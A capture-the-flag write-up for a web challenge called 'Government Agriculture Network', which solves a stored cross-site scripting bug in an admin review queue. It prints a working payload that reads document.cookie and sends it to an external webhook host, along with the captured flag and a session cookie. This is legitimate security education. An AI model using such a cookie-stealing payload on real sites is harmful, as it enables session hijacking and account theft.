# Government Agriculture Network
## Description
Well it seems someone can't keep their work life and their home life separate. You vaguely recall on your home planet, posters put up everywhere that said "Loose Zips sink large commercial properties with a responsibility to the shareholders." You wonder if there is a similar concept here. Using the credentials to access this so-called Agricultural network, you realize that SarahH was just hired as a vendor or contract worker and given access that was equivalent. You can only assume that Vendor/Contractor is the highest possible rank bestowed upon only the most revered and well regarded individuals of the land and expect information and access to flow like the Xenovian acid streams you used to bathe in as a child. The portal picture displays that small very attractive individual whom you instantly form a bond with, despite not knowing. You must meet this entity! Converse and convince them you're meant to be! After a brief amount of time the picture shifts into a biped presumably ingesting this creature! HOW DARE THEY. You have to save them, you have to stop this from happening. Get more information about this Gubberment thing and stop this atrocity. You need to get in closer to save them - you beat on the window, but you need access to the cauliflower's host to rescue it.

## Solution
We will begin by examining the site https://govagriculture.web.ctfcompetition.com/ . The anchor id hints that this is a cross-site scripting challenge (XSS). The webpage contains:

* Link to /admin page
* Form input
* Two images

We should try submitting HTML tags and JavaScript since XSS executes code in the context of the user viewing the vulnerable page.

1. What happens if we visit `/admin`?

Nothing

2. What happens when we submit a script tag such as `<script>alert(1)</script>`?

We land on a page with the following message
```
Your post was submitted for review. Administator will take a look shortly. 
```

The `<script>` tag isn't found in the source, but this message hints at a moderation queue. We may be able to execute code when an admin views the queue.

3. Does anything actually happen on submission?

We can modify `<script>` to perform a request by setting the `src` attribute. A website such as https://webhook.site/ can be used for logging requests.

Let's try again with
```html
<script src="https://webhook.site/f610b3ae-9ba3-44d1-84f2-c5c8d7b7ec64"></script>
```

This results in a request from `https://govagriculture.web.ctfcompetition.com/pwn?msg=%3Cscript+src%3D%22https%3A%2F%2Fwebhook.site%2Ff610b3ae-9ba3-44d1-84f2-c5c8d7b7ec64%22%3E%3C%2Fscript%3E`.

Great, the `<script>` executed.

4. How do we exfiltrate data?

Arbitrary HTML means we can retrieve the admin's cookies and pass it to our server using JS. This assumes that `HTTPOnly` isn't set for the important cookies. The admin cookies may grant access to the admin interface.

We can use the following payload
```html
<img id="foo">
<script>
    document.addEventListener("DOMContentLoaded", function() {
        // force request to our site and pass cookie in query string 
        document.getElementById("foo").src = "https://webhook.site/f610b3ae-9ba3-44d1-84f2-c5c8d7b7ec64?" + encodeURIComponent(document.cookie);
    })
</script>
```

This results in a request with following query string `flag=CTF{8aaa2f34b392b415601804c2f5f0f24e};_session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV`. Setting the `_session` cookie doesn't do anything.

### Flag
`CTF{8aaa2f34b392b415601804c2f5f0f24e}`